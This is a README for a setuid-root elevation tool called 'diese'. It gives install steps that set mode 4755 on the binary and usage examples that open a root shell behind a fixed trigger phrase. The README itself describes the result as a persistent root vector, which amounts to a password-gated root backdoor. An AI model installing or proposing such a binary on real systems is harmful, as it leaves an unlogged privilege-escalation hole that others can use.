# diese - The Blade v3.5

A minimal, hardened, setuid root elevation tool with trigger protection.
Built for those who don't trust sudo, doas, or pkexec.

## WARNING

**This is a loaded gun.** Treat it with extreme paranoia.

- This binary becomes a persistent root vector once chmod 4755.
- Anyone with physical or initial access can try to use it.
- The trigger phrase is your only protection against random execution.
- Recompile with your own trigger and MAGIC string before every deployment.
- Never leave the source on untrusted systems.
- Audit every line before compiling.
- On compromised systems this can be used against you.

## Build Instructions

### On FreeBSD / Linux

```bash
git clone https://github.com/TwrstLOL/diese.git
cd diese
make clean
make
```

Then install:

```bash
sudo chown root:wheel diese
sudo chmod 4755 diese
sudo mv diese /usr/local/bin/diese
```

## Usage

```bash
diese diese1337 id
diese diese1337 whoami
diese diese1337 /bin/sh
```

Change the `TRIGGER` in `diese.c` and recompile for better security.

## Features
- Cross-platform (Linux + FreeBSD)
- Trigger phrase protection
- Environment + argv sanitization
- No new privileges hardening
- Stripped binary

**Stay in the shadows.**
